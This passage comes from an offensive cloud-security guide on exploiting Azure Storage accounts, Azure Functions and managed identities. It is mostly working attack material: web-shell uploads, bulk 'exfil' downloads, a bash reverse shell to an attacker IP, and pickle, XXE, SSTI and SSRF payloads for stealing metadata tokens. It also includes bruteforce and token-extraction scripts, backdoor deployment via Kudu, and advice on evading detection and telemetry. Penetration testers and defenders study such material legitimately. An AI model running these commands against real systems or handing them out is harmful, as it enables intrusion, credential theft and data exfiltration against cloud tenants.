az storage blob download --container-name <container> --name <blob-name> --file <local-path>
az storage blob download -c <container> -n <blob> -f output.txt

# Download entire container
az storage blob download-batch --destination ./downloads --source <container>

# Upload malicious blob
az storage blob upload --container-name <container> --name <blob-name> --file <local-file>
az storage blob upload -c <container> -n shell.aspx -f webshell.aspx
```

#### File Share Exploitation

```bash
# List file shares
az storage share list --output table

# List directories in share
az storage directory list --share-name <share> --output table

# List files in directory
az storage file list --share-name <share> --path <directory> --output table

# Download file
az storage file download --share-name <share> --path <file-path> --dest <local-path>

# Upload file
az storage file upload --share-name <share> --source <local-file> --path <remote-path>

# Mount file share (Linux)
sudo mkdir /mnt/azure
sudo mount -t cifs //<account>.file.core.windows.net/<share> /mnt/azure \
  -o vers=3.0,username=<account>,password=<key>,dir_mode=0777,file_mode=0777
```

#### Queue and Table Operations

```bash
# List queues
az storage queue list --output table

# Peek messages (non-destructive)
az storage message peek --queue-name <queue> --num-messages 32

# Get and delete messages
az storage message get --queue-name <queue> --num-messages 1

# List tables
az storage table list --output table

# Query table entities
az storage entity query --table-name <table> --output json
```

### Exploitation with Azure Storage Explorer

```bash
# Download Storage Explorer
wget https://go.microsoft.com/fwlink/?LinkId=722418 -O StorageExplorer.tar.gz

# Connect using connection string
# GUI: Edit → Add Account → Use connection string

# Connect using account name and key
# GUI: Edit → Add Account → Storage account name and key
```

### PowerShell Exploitation (Windows)

#### Using AzureRM Module

```powershell
# Install module
Install-Module -Name Az.Storage -Force -AllowClobber

# Create storage context
$ctx = New-AzStorageContext -StorageAccountName "<account>" -StorageAccountKey "<key>"

# List containers
Get-AzStorageContainer -Context $ctx

# List blobs
Get-AzStorageBlob -Container "<container>" -Context $ctx

# Download blob
Get-AzStorageBlob -Container "<container>" -Blob "<blob>" -Context $ctx | Get-AzStorageBlobContent -Destination "C:\temp\"

# Upload blob
Set-AzStorageBlobContent -Container "<container>" -File "C:\path\shell.aspx" -Blob "shell.aspx" -Context $ctx
```

### REST API Direct Exploitation

#### Authentication Header Generation

```bash
# Shared Key authentication requires:
# Authorization: SharedKey <account>:<signature>

# Example using curl (simplified - actual implementation requires proper signature)
# [Inference] Direct REST API exploitation requires implementing the SharedKey signature algorithm

# List containers
curl -H "x-ms-version: 2019-12-12" \
     -H "Authorization: SharedKey <account>:<signature>" \
     "https://<account>.blob.core.windows.net/?comp=list"

# Get blob
curl "https://<account>.blob.core.windows.net/<container>/<blob>?<SAS-token>"
```

### Python Exploitation Scripts

#### Using azure-storage-blob

```python
from azure.storage.blob import BlobServiceClient

# Connect using connection string
connection_string = "DefaultEndpointsProtocol=https;AccountName=...;AccountKey=...;EndpointSuffix=core.windows.net"
blob_service = BlobServiceClient.from_connection_string(connection_string)

# List containers
containers = blob_service.list_containers()
for container in containers:
    print(f"Container: {container.name}")
    
    # List blobs in container
    container_client = blob_service.get_container_client(container.name)
    blobs = container_client.list_blobs()
    for blob in blobs:
        print(f"  - {blob.name} ({blob.size} bytes)")

# Download blob
blob_client = blob_service.get_blob_client(container="<container>", blob="<blob>")
with open("downloaded.txt", "wb") as f:
    data = blob_client.download_blob()
    f.write(data.readall())

# Upload blob
with open("webshell.aspx", "rb") as f:
    blob_client = blob_service.get_blob_client(container="<container>", blob="shell.aspx")
    blob_client.upload_blob(f, overwrite=True)
```

#### Automated Container Scraping

```python
#!/usr/bin/env python3
from azure.storage.blob import BlobServiceClient
import os

def enumerate_storage(connection_string, download_path="./loot"):
    os.makedirs(download_path, exist_ok=True)
    blob_service = BlobServiceClient.from_connection_string(connection_string)
    
    print("[*] Enumerating containers...")
    for container in blob_service.list_containers():
        print(f"[+] Container: {container.name}")
        container_path = os.path.join(download_path, container.name)
        os.makedirs(container_path, exist_ok=True)
        
        container_client = blob_service.get_container_client(container.name)
        for blob in container_client.list_blobs():
            print(f"  [+] Downloading: {blob.name}")
            blob_client = blob_service.get_blob_client(container=container.name, blob=blob.name)
            
            # Create subdirectories if needed
            blob_path = os.path.join(container_path, blob.name)
            os.makedirs(os.path.dirname(blob_path), exist_ok=True)
            
            try:
                with open(blob_path, "wb") as f:
                    data = blob_client.download_blob()
                    f.write(data.readall())
            except Exception as e:
                print(f"    [!] Error: {e}")

if __name__ == "__main__":
    conn_str = input("Enter connection string: ")
    enumerate_storage(conn_str)
```

### Post-Exploitation Actions

#### Data Exfiltration

```bash
# Sync entire storage account
az storage blob download-batch --destination ./exfil --source <container> --pattern "*"

# Target high-value files
az storage blob download-batch --destination ./exfil --source <container> --pattern "*.sql"
az storage blob download-batch --destination ./exfil --source <container> --pattern "*.bak"
az storage blob download-batch --destination ./exfil --source <container> --pattern "*backup*"
az storage blob download-batch --destination ./exfil --source <container> --pattern "*password*"
```

#### Persistence

```bash
# Generate SAS token for long-term access
az storage container generate-sas \
  --account-name <account> \
  --account-key <key> \
  --name <container> \
  --permissions racwdl \
  --expiry 2030-12-31 \
  --https-only

# Upload web shell to static website container
# [Inference] If static website hosting is enabled, containers named $web are web-accessible
az storage blob upload -c '$web' -n shell.aspx -f webshell.aspx
# Access: https://<account>.z13.web.core.windows.net/shell.aspx
```

#### Lateral Movement Indicators

```bash
# Search for credentials in downloaded blobs
grep -r "password" ./loot/
grep -r "secret" ./loot/
grep -r "connection" ./loot/ | grep -i "string"
grep -r "DefaultEndpointsProtocol" ./loot/

# Search for configuration files
find ./loot/ -name "*.config"
find ./loot/ -name "appsettings*.json"
find ./loot/ -name "web.config"
find ./loot/ -name ".env"
```

### Defense Evasion

#### Key Rotation Detection

[Inference] Monitoring for key rotation events can indicate defensive response:

```bash
# If keys stop working, they may have been rotated
# Check for 403 responses instead of 200/201

# Test key validity
az storage container list 2>&1 | grep -q "403" && echo "[!] Key may be rotated"
```

#### Avoiding Detection Indicators

- Use `--output json` instead of `--output table` to reduce logging verbosity
- Throttle requests to avoid rate-limiting alerts
- Download only targeted files instead of entire containers
- Use SAS tokens instead of account keys when possible for reduced audit trail

### Common Misconfigurations

1. **Anonymous Blob Access**: Containers set to public read access

```bash
# Check for public containers (no authentication needed)
curl -I https://<account>.blob.core.windows.net/<container>/<blob>
# 200 response = publicly accessible
```

2. **Overly Permissive SAS Tokens**: Long-lived tokens with full permissions

```bash
# SAS token format
https://<account>.blob.core.windows.net/<container>/<blob>?sv=2020-08-04&ss=b&srt=co&sp=rwdlac&se=2030-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=<signature>

# Parameters:
# sp = permissions (r=read, w=write, d=delete, l=list, a=add, c=create)
# se = expiry time
```

3. **Stored Access Policies**: Named policies that can grant extended access

```bash
# List stored access policies
az storage container policy list --container-name <container> --account-name <account> --account-key <key>
```

### Related Tools

#### MicroBurst

```bash
# PowerShell module for Azure exploitation
git clone https://github.com/NetSPI/MicroBurst
cd MicroBurst
Import-Module ./MicroBurst.psm1

# Enumerate public storage accounts
Invoke-EnumerateAzureBlobs -Base <company-name>

# Search for exposed storage accounts
Invoke-EnumerateAzureBlobs -Base <keyword> -OutputFile results.txt
```

#### StorageFinder (Custom Tool Example)

```bash
#!/bin/bash
# Simple storage account enumeration
ACCOUNT=$1
WORDLIST=$2

while read container; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://${ACCOUNT}.blob.core.windows.net/${container}?restype=container&comp=list")
  if [ "$STATUS" == "200" ]; then
    echo "[+] Public container: $container"
  fi
done < "$WORDLIST"
```

---

## Azure Function Exploitation

### Overview

Azure Functions are serverless compute services that execute code in response to triggers (HTTP, timer, queue, etc.). Security issues arise from misconfigurations in authentication, authorization, and code vulnerabilities. Functions often have elevated permissions through Managed Identities, making them high-value targets.

### Azure Functions Architecture

#### Function App Components

- **Function App**: Container for one or more functions
- **Functions**: Individual code units with specific triggers
- **Host**: Runtime environment (Node.js, Python, .NET, Java, PowerShell)
- **Triggers**: Events that invoke functions (HTTP, timer, blob, queue, etc.)
- **Bindings**: Input/output connections to other Azure services

#### Authentication Levels

```
Anonymous: No authentication required
Function: Requires function-specific key
Admin: Requires master (admin) key
```

### Enumeration

#### Identifying Azure Functions

```bash
# DNS pattern
*.azurewebsites.net

# Fingerprinting
curl -I https://<app-name>.azurewebsites.net
# Look for: X-Powered-By, Server headers

# Specific function URL pattern
https://<app-name>.azurewebsites.net/api/<function-name>

# Alternative URLs with deployment slots
https://<app-name>-staging.azurewebsites.net/api/<function-name>

# SCM (Kudu) endpoint
https://<app-name>.scm.azurewebsites.net
```

#### Discovering Function Names

```bash
# Directory bruteforcing
ffuf -u https://<app-name>.azurewebsites.net/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Common function names wordlist
cat << 'EOF' > azure-functions.txt
GetUser
GetUsers
CreateUser
UpdateUser
DeleteUser
ProcessQueue
ProcessMessage
UploadFile
DownloadFile
Webhook
Health
Status
Info
Debug
Test
Admin
Execute
Run
Trigger
EOF

# Fuzz with common names
ffuf -u https://<app-name>.azurewebsites.net/api/FUZZ -w azure-functions.txt -mc 200,401,403
```

#### Kudu SCM Exploitation

```bash
# Access Kudu console (if not properly secured)
https://<app-name>.scm.azurewebsites.net/DebugConsole

# API endpoints
https://<app-name>.scm.azurewebsites.net/api/vfs/  # Virtual file system
https://<app-name>.scm.azurewebsites.net/api/command  # Command execution
https://<app-name>.scm.azurewebsites.net/api/dump  # Memory dump
https://<app-name>.scm.azurewebsites.net/api/processes  # Process list

# Download function app content
curl https://<app-name>.scm.azurewebsites.net/api/zip/site/wwwroot/ -o function-app.zip

# [Inference] Kudu endpoints may require authentication via deployment credentials or managed identity
```

### Function Key Extraction

#### Key Types and Usage

```bash
# Master (Host) Key: Access to all functions and admin APIs
# Function Key: Access to specific function
# System Key: Internal use

# Key in URL (GET request)
https://<app-name>.azurewebsites.net/api/<function>?code=<function-key>

# Key in header (preferred)
curl -H "x-functions-key: <function-key>" https://<app-name>.azurewebsites.net/api/<function>
```

#### Extracting Keys from Source

**Configuration Files**

```bash
# local.settings.json (development)
{
  "IsEncrypted": false,
  "Values": {
    "AzureWebJobsStorage": "DefaultEndpointsProtocol=https;...",
    "FUNCTIONS_WORKER_RUNTIME": "node",
    "API_KEY": "...",
    "FUNCTION_KEY": "..."
  }
}

# host.json (function app settings)
# .env files
# appsettings.json
```

**Azure CLI Extraction**

```bash
# List function keys (requires contributor+ permissions)
az functionapp keys list --name <app-name> --resource-group <rg-name>

# Get master key
az functionapp keys list --name <app-name> --resource-group <rg-name> --query "masterKey" -o tsv

# List function-specific keys
az functionapp function keys list --name <app-name> --resource-group <rg-name> --function-name <function>
```

**REST API Extraction**

```bash
# Get function keys via management API
# Requires valid Azure bearer token
curl -H "Authorization: Bearer <token>" \
  "https://management.azure.com/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Web/sites/<app-name>/functions/<function>/listkeys?api-version=2022-03-01" \
  -X POST

# Get host keys
curl -H "Authorization: Bearer <token>" \
  "https://management.azure.com/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Web/sites/<app-name>/host/default/listkeys?api-version=2022-03-01" \
  -X POST
```

### HTTP Trigger Exploitation

#### Authentication Bypass

**Anonymous Functions**

```bash
# Test for anonymous access
curl https://<app-name>.azurewebsites.net/api/<function>

# No key required if function.json contains:
# "authLevel": "anonymous"
```

**Function Key Bruteforce**

```bash
# Keys are base64-encoded strings
# Example format: <app-name>-<guid>==

# Bruteforce script
#!/bin/bash
FUNCTION_URL="https://<app-name>.azurewebsites.net/api/<function>"
WORDLIST=$1

while read key; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "x-functions-key: $key" "$FUNCTION_URL")
  if [ "$RESPONSE" != "401" ]; then
    echo "[+] Valid key: $key (HTTP $RESPONSE)"
  fi
done < "$WORDLIST"
```

#### Parameter Injection

**Command Injection**

```bash
# If function executes system commands based on input
curl -H "x-functions-key: <key>" \
  -H "Content-Type: application/json" \
  -d '{"command": "ls; whoami"}' \
  https://<app-name>.azurewebsites.net/api/<function>

# Common injection points
{"file": "test.txt; cat /etc/passwd"}
{"username": "admin' OR '1'='1"}
{"path": "../../../etc/passwd"}
{"url": "file:///etc/passwd"}
```

**NoSQL Injection (Cosmos DB)**

```bash
# If function queries Cosmos DB
curl -H "x-functions-key: <key>" \
  -H "Content-Type: application/json" \
  -d '{"userId": {"$ne": null}}' \
  https://<app-name>.azurewebsites.net/api/GetUser

# Return all documents
{"filter": {"$where": "1==1"}}
```

**SSRF via HTTP Clients**

```bash
# If function makes HTTP requests based on input
curl -H "x-functions-key: <key>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}' \
  https://<app-name>.azurewebsites.net/api/FetchUrl

# Target internal services
{"url": "http://internal-api.azurewebsites.net/admin"}
{"url": "http://localhost:80/admin"}

# Metadata endpoint for instance metadata
{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
```

### Code Execution Techniques

#### Python Functions

```python
# Vulnerable function example
import azure.functions as func
import subprocess

def main(req: func.HttpRequest) -> func.HttpResponse:
    command = req.params.get('command')
    if command:
        result = subprocess.run(command, shell=True, capture_output=True)
        return func.HttpResponse(result.stdout)
```

**Exploitation**

```bash
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=whoami"

# Reverse shell
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'"
```

#### Node.js Functions

```javascript
// Vulnerable function
module.exports = async function (context, req) {
    const exec = require('child_process').exec;
    const command = req.query.command;
    
    exec(command, (error, stdout, stderr) => {
        context.res = { body: stdout };
    });
}
```

**Exploitation**

```bash
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/NodeExec?command=cat%20/etc/passwd"
```

#### .NET Functions

```csharp
// Vulnerable C# function
[FunctionName("Execute")]
public static async Task<IActionResult> Run(
    [HttpTrigger(AuthorizationLevel.Function, "get")] HttpRequest req)
{
    string command = req.Query["command"];
    var process = Process.Start("cmd.exe", $"/c {command}");
    process.WaitForExit();
    return new OkObjectResult("Done");
}
```

### File System Access

#### Accessing Function App Files

```bash
# Function app structure
/home/site/wwwroot/
  ├── function-name/
  │   ├── function.json  # Function configuration
  │   ├── index.js       # Function code (Node.js)
  │   └── __init__.py    # Function code (Python)
  ├── host.json          # Host configuration
  ├── local.settings.json # Local settings (not deployed)
  └── requirements.txt   # Dependencies

# Read function code via path traversal
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/ReadFile?path=../function.json"

# Download via Kudu
curl https://<app-name>.scm.azurewebsites.net/api/vfs/site/wwwroot/<function>/function.json -o function.json
```

#### Environment Variable Extraction

```bash
# Access via vulnerable function
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=env"

# Common sensitive variables
WEBSITE_AUTH_ENABLED
APPSETTING_WEBSITE_AUTH_ENABLED
AzureWebJobsStorage  # Storage account connection string
FUNCTIONS_EXTENSION_VERSION
APPINSIGHTS_INSTRUMENTATIONKEY
DATABASE_CONNECTION_STRING
API_KEY
SECRET_KEY

# Kudu environment endpoint
curl https://<app-name>.scm.azurewebsites.net/api/settings
```

### Managed Identity Abuse from Functions

#### Detecting Managed Identity

```bash
# Check if MSI_ENDPOINT is set
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=echo%20$MSI_ENDPOINT"

# Windows equivalent
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=echo%20%25MSI_ENDPOINT%25"
```

#### Obtaining Access Tokens

```bash
# Python code to get token from within function
import os
import requests

def get_token(resource):
    msi_endpoint = os.environ.get('MSI_ENDPOINT')
    msi_secret = os.environ.get('MSI_SECRET')
    
    headers = {'X-IDENTITY-HEADER': msi_secret}
    params = {'api-version': '2019-08-01', 'resource': resource}
    
    response = requests.get(msi_endpoint, headers=headers, params=params)
    return response.json()['access_token']

# Get token for Azure Resource Manager
token = get_token('https://management.azure.com/')

# Get token for Key Vault
token = get_token('https://vault.azure.net')

# Get token for Storage
token = get_token('https://storage.azure.com/')
```

**Via Vulnerable Function**

```bash
# Inject token retrieval
curl -H "x-functions-key: <key>" \
  -H "Content-Type: application/json" \
  -d '{"code": "import os; import requests; r=requests.get(os.environ[\"MSI_ENDPOINT\"], headers={\"X-IDENTITY-HEADER\": os.environ[\"MSI_SECRET\"]}, params={\"api-version\": \"2019-08-01\", \"resource\": \"https://management.azure.com/\"}); print(r.json()[\"access_token\"])"}' \
  https://<app-name>.azurewebsites.net/api/Eval
```

#### Using Stolen Tokens

```bash
# List resources accessible by managed identity
curl -H "Authorization: Bearer <token>" \
  "https://management.azure.com/subscriptions/<sub-id>/resources?api-version=2021-04-01"

# Read secrets from Key Vault
curl -H "Authorization: Bearer <token>" \
  "https://<vault-name>.vault.azure.net/secrets/<secret-name>?api-version=7.2"

# Access storage with managed identity
az login --identity --username <client-id>
az storage blob list --account-name <account> --container-name <container>
```

### Durable Functions Exploitation

#### Overview

Durable Functions extend Azure Functions with stateful workflows. [Inference] State is stored in Azure Storage, potentially exposing workflow data.

#### Accessing Durable Function State

```bash
# Durable functions use storage account for state
# Default container: azure-webjobs-hosts
# Default table: <function-app-name>Instances

# If storage key is obtained
az storage blob list --account-name <account> --container-name azure-webjobs-hosts

# Download state files
az storage blob download --account-name <account> \
  --container-name azure-webjobs-hosts \
  --name DurableFunctionsHub/<instance-id>/history \
  --file history.json
```

#### Manipulating Workflow State

```bash
# [Speculation] Modifying state blobs could alter workflow execution
# Requires understanding of internal state format

# Trigger orchestration
curl -X POST -H "x-functions-key: <key>" \
  -H "Content-Type: application/json" \
  -d '{"input": "malicious-data"}' \
  https://<app-name>.azurewebsites.net/api/orchestrators/<orchestrator-name>

# Query status
curl -H "x-functions-key: <key>" \
  https://<app-name>.azurewebsites.net/runtime/webhooks/durabletask/instances/<instance-id>
```

### Privilege Escalation Vectors

#### Function App Contributor Role

```bash
# If attacker has Contributor on Function App, can modify functions
az functionapp deployment source config-zip \
  --resource-group <rg> \
  --name <app-name> \
  --src malicious-function.zip

# Deploy malicious function that exfiltrates credentials
```

#### Deployment Credentials

```bash
# Obtain publishing profile
az functionapp deployment list-publishing-profiles \
  --name <app-name> \
  --resource-group <rg> \
  --query "[?publishMethod=='FTP'].[publishUrl,userName,userPWD]" -o tsv

# FTP deployment
ftp <ftp-url>
# Login with credentials
# put webshell.aspx /site/wwwroot/webshell.aspx
```

### Post-Exploitation

#### Persistence

```bash
# Upload backdoor function
# Create new function with anonymous auth
{
  "bindings": [{
    "authLevel": "anonymous",
    "type": "httpTrigger",
    "direction": "in",
    "name": "req",
    "methods": ["get", "post"]
  }]
}

# Deploy via Kudu
curl -X PUT \
  -H "Authorization: Basic <base64-creds>" \
  --data-binary @backdoor.zip \
  https://<app-name>.scm.azurewebsites.net/api/zipdeploy
```

#### Lateral Movement

```bash
# Search function code for credentials
grep -r "password" /home/site/wwwroot/
grep -r "connectionString" /home/site/wwwroot/
grep -r "key" /home/site/wwwroot/ | grep -v "function.json"

# Check application settings for secrets
curl https://<app-name>.scm.azurewebsites.net/api/settings
```

### Defense Evasion

#### Avoiding Application Insights Telemetry

```bash
# Disable or minimize logging in exploited functions
# [Inference] Heavy request patterns may trigger alerts

# Check if Application Insights is configured

curl -H "x-functions-key: <key>"  
"https://<app-name>.azurewebsites.net/api/Execute?command=env | grep APPINSIGHTS"

# [Inference] Requests that mimic normal traffic patterns are less likely to trigger anomaly detection

# Use realistic User-Agent headers

curl -H "x-functions-key: <key>"  
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"  
https://<app-name>.azurewebsites.net/api/<function>

# Throttle requests to avoid rate-based detection

for i in {1..10}; do curl -H "x-functions-key: <key>" https://<app-name>.azurewebsites.net/api/<function> sleep 30 done

````

#### Obfuscating Payloads
```bash
# Base64 encoding
PAYLOAD=$(echo "cat /etc/passwd" | base64)
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=echo $PAYLOAD | base64 -d | bash"

# Hex encoding
PAYLOAD=$(echo "whoami" | xxd -p)
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=echo $PAYLOAD | xxd -r -p | bash"

# Using environment variables
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Execute?command=\$SHELL"
````

### Common Vulnerabilities

#### Insecure Deserialization

```python
# Vulnerable Python function
import pickle
import base64

def main(req: func.HttpRequest):
    data = req.params.get('data')
    obj = pickle.loads(base64.b64decode(data))
    return func.HttpResponse(str(obj))
```

**Exploitation**

```python
#!/usr/bin/env python3
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Payload: {payload}")

# Send payload
# curl -H "x-functions-key: <key>" \
#   "https://<app-name>.azurewebsites.net/api/Deserialize?data={payload}"
```

#### XML External Entity (XXE)

```python
# Vulnerable function parsing XML
import xml.etree.ElementTree as ET

def main(req: func.HttpRequest):
    xml_data = req.get_body().decode()
    root = ET.fromstring(xml_data)
    return func.HttpResponse(root.text)
```

**Exploitation**

```bash
# XXE payload
cat << 'EOF' > xxe.xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF

curl -H "x-functions-key: <key>" \
  -H "Content-Type: application/xml" \
  --data @xxe.xml \
  https://<app-name>.azurewebsites.net/api/ParseXML

# SSRF via XXE
cat << 'EOF' > xxe-ssrf.xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">
]>
<root>&xxe;</root>
EOF
```

#### Server-Side Template Injection (SSTI)

```python
# Vulnerable Jinja2 template rendering
from jinja2 import Template

def main(req: func.HttpRequest):
    template_str = req.params.get('template')
    template = Template(template_str)
    return func.HttpResponse(template.render())
```

**Exploitation**

```bash
# Test for SSTI
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Render?template={{7*7}}"
# Response: 49

# RCE payload (Jinja2)
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Render?template={{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}"

# Alternative payload
curl -H "x-functions-key: <key>" \
  "https://<app-name>.azurewebsites.net/api/Render?template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

### Azure Functions Proxies

#### Proxy Configuration Exploitation

```json
// proxies.json
{
  "proxies": {
    "proxy1": {
      "matchCondition": {
        "route": "/api/external"
      },
      "backendUri": "https://backend-service.com/api"
    }
  }
}
```

**SSRF via Proxy Misconfiguration**

```bash
# If proxy allows attacker-controlled backend URLs
curl -H "x-functions-key: <key>" \
  -H "Content-Type: application/json" \
  -d '{"backendUri": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"}' \
  https://<app-name>.azurewebsites.net/admin/api/proxies/proxy1

# Access internal services
curl -H "x-functions-key: <key>" \
  https://<app-name>.azurewebsites.net/api/external
```

### Container-based Function Apps

#### Docker Image Exploitation

```bash
# Pull function app image if accessible
docker pull <registry>.azurecr.io/<app-name>:latest

# Extract image layers
docker save <registry>.azurecr.io/<app-name>:latest -o app.tar
tar -xf app.tar

# Search for secrets in layers
grep -r "password" .
grep -r "connectionString" .
grep -r "key" . | grep -v ".json"

# Find Dockerfile
find . -name "Dockerfile"
```

#### Accessing Container Registry

```bash
# If registry credentials obtained
az acr login --name <registry>

# List images
az acr repository list --name <registry> --output table

# Download image
az acr repository show-tags --name <registry> --repository <app-name>
docker pull <registry>.azurecr.io/<app-name>:<tag>
```

### Function App Slots (Staging/Production)

#### Slot Enumeration

```bash
# Common slot names
https://<app-name>-staging.azurewebsites.net
https://<app-name>-dev.azurewebsites.net
https://<app-name>-test.azurewebsites.net
https://<app-name>-qa.azurewebsites.net

# List slots via Azure CLI
az functionapp deployment slot list \
  --name <app-name> \
  --resource-group <rg-name> \
  --output table

# [Inference] Staging slots may have weaker security controls or test credentials
```

#### Slot Swapping Exploitation

```bash
# If attacker has permissions to swap slots
az functionapp deployment slot swap \
  --name <app-name> \
  --resource-group <rg-name> \
  --slot staging \
  --target-slot production

# Deploy malicious code to staging, then swap to production
```

### Automation Scripts

#### Full Function App Enumeration

```python
#!/usr/bin/env python3
import requests
import sys
import json

def enumerate_functions(base_url, function_key=None):
    """Enumerate Azure Function endpoints"""
    
    headers = {}
    if function_key:
        headers['x-functions-key'] = function_key
    
    # Common function names
    common_names = [
        'GetUser', 'GetUsers', 'CreateUser', 'UpdateUser', 'DeleteUser',
        'ProcessQueue', 'ProcessMessage', 'UploadFile', 'DownloadFile',
        'Webhook', 'Health', 'Status', 'Info', 'Debug', 'Test', 'Admin',
        'Execute', 'Run', 'Trigger', 'Process', 'Handle', 'Submit'
    ]
    
    print(f"[*] Enumerating {base_url}")
    found = []
    
    for name in common_names:
        url = f"{base_url}/api/{name}"
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code != 404:
                print(f"[+] Found: {name} (HTTP {response.status_code})")
                found.append({
                    'name': name,
                    'url': url,
                    'status': response.status_code,
                    'auth_required': response.status_code == 401
                })
        except Exception as e:
            print(f"[-] Error checking {name}: {e}")
    
    return found

def test_vulnerabilities(function_url, function_key=None):
    """Test common vulnerabilities"""
    
    headers = {'Content-Type': 'application/json'}
    if function_key:
        headers['x-functions-key'] = function_key
    
    tests = {
        'Command Injection': {'command': 'whoami'},
        'SQL Injection': {'userId': "1' OR '1'='1"},
        'Path Traversal': {'file': '../../../etc/passwd'},
        'SSRF': {'url': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'},
        'XXE': None,  # Requires XML payload
        'SSTI': {'template': '{{7*7}}'}
    }
    
    print(f"\n[*] Testing vulnerabilities on {function_url}")
    
    for test_name, payload in tests.items():
        if payload is None:
            continue
            
        try:
            response = requests.post(function_url, json=payload, headers=headers, timeout=10)
            print(f"[*] {test_name}: HTTP {response.status_code}")
            
            # Check for indicators
            if test_name == 'Command Injection' and 'root' in response.text.lower():
                print(f"[!] Possible command injection vulnerability!")
            elif test_name == 'SSTI' and '49' in response.text:
                print(f"[!] Possible SSTI vulnerability!")
                
        except Exception as e:
            print(f"[-] {test_name} test failed: {e}")

def extract_managed_identity_token(function_url, function_key, resource):
    """Attempt to extract managed identity token"""
    
    headers = {'x-functions-key': function_key, 'Content-Type': 'application/json'}
    
    # Payload to get MSI token (requires vulnerable function)
    payload = {
        'code': f'''
import os
import requests
msi_endpoint = os.environ.get("MSI_ENDPOINT")
msi_secret = os.environ.get("MSI_SECRET")
if msi_endpoint:
    headers = {{"X-IDENTITY-HEADER": msi_secret}}
    params = {{"api-version": "2019-08-01", "resource": "{resource}"}}
    r = requests.get(msi_endpoint, headers=headers, params=params)
    print(r.json().get("access_token"))
'''
    }
    
    try:
        response = requests.post(function_url, json=payload, headers=headers, timeout=10)
        if 'eyJ' in response.text:  # JWT token starts with eyJ
            print(f"[+] Managed identity token obtained!")
            return response.text
    except Exception as e:
        print(f"[-] Token extraction failed: {e}")
    
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <function-app-url> [function-key]")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip('/')
    function_key = sys.argv[2] if len(sys.argv) > 2 else None
    
    # Enumerate functions
    functions = enumerate_functions(base_url, function_key)
    
    # Test each found function
    if function_key:
        for func in functions:
            test_vulnerabilities(func['url'], function_key)
    
    print("\n[*] Enumeration complete")
```

#### Kudu File Downloader

```bash
#!/bin/bash
# Download all files from Kudu SCM

KUDU_URL=$1
OUTPUT_DIR=${2:-"./kudu-dump"}
CREDS=$3  # Optional: username:password for basic auth

if [ -z "$KUDU_URL" ]; then
  echo "Usage: $0 <kudu-url> [output-dir] [username:password]"
  exit 1
fi

mkdir -p "$OUTPUT_DIR"

AUTH_HEADER=""
if [ -n "$CREDS" ]; then
  AUTH_HEADER="-u $CREDS"
fi

# Download directory structure
echo "[*] Downloading file list..."
curl -s $AUTH_HEADER "$KUDU_URL/api/vfs/site/wwwroot/" | jq -r '.[].href' > files.txt

# Download each file
while read file_url; do
  filename=$(echo "$file_url" | sed "s|$KUDU_URL/api/vfs/site/wwwroot/||")
  echo "[+] Downloading: $filename"
  
  mkdir -p "$OUTPUT_DIR/$(dirname "$filename")"
  curl -s $AUTH_HEADER "$file_url" -o "$OUTPUT_DIR/$filename"
done < files.txt

echo "[*] Download complete: $OUTPUT_DIR"
rm files.txt
```

---

## Managed Identity Exploitation

### Overview

Azure Managed Identities provide Azure services with automatically managed identities in Azure AD. Resources can use these identities to obtain access tokens for other Azure services without storing credentials. Exploitation involves leveraging compromised resources to access additional services through their assigned managed identity.

### Types of Managed Identities

#### System-Assigned Managed Identity

- Lifecycle tied to the Azure resource
- Automatically created and deleted with the resource
- Cannot be shared across resources
- Represented by a service principal in Azure AD

#### User-Assigned Managed Identity

- Independent lifecycle from Azure resources
- Can be assigned to multiple resources
- Managed separately as standalone Azure resource
- More flexible for complex scenarios

### Architecture and Token Flow

#### Azure Instance Metadata Service (IMDS)

```bash
# IMDS endpoint (accessible from Azure VMs, containers, functions)
http://169.254.169.254/metadata/identity/oauth2/token

# Required parameters:
# - api-version: 2018-02-01 or later
# - resource: Target resource URI (e.g., https://management.azure.com/)

# Required header:
